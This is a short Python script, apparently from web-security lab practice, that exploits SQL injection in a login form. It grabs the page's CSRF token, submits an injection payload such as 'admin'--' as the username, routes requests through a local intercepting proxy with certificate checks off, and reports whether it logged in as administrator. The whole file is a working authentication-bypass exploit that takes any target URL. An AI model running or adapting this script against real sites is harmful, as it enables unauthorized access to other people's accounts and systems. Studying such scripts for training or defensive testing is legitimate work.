import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    response = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {
        'csrf': csrf,
        'username': payload,
        'password': 'randomtext'
    }
    response = s.post(url, data=data, verify=False, proxies=proxies)
    response_text = response.text

    if 'Log out' in response_text:
        return True
    else:
        return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
        print(f'[-] Example: {sys.argv[0]} www.example.com "admin\'--"')
        sys.exit(-1)

    s = requests.session()

    if exploit_sqli(s, url, payload):
        print(
            '[+] SQL Injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL Injection unsuccessful!')
